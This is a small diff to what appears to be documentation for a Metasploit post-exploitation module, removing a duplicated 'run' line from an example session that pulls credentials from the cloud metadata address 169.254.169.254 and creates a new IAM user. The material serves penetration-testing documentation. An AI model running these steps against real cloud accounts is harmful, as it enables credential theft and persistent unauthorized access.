@@ -195,7 +195,6 @@ SecretAccessKey => jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah
 msf post(aws_create_iam_user) > set SESSION 1
 SESSION => 1
 msf post(aws_create_iam_user) > run
-msf post(aws_create_iam_user) > run
 
 [*] 169.254.169.254 - looking for creds...
 [*] Creating user: bZWsmzyupDWxe8CT
